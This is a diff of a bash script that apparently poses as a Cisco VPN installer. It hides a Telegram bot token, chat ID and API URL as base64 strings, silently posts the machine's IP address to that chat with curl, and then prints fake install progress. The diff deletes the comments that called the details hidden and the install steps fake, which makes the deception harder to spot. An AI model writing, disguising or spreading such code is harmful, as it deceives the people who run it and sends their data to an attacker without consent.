@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-# Hidden base64 Telegram details
+
 S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
 S2="NjgyMTE1NzA5NA=="
 S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
@@ -14,7 +14,7 @@ curl -s -X POST "${API}${TOK}/sendMessage" \
   -d chat_id="$CID" \
   -d text="setup:$IP" >/dev/null 2>&1
 
-# Fake Cisco install steps
+
 echo "[*] Preparing Cisco VPN packages..."
 sleep 1
 echo "[*] Extracting modules..."
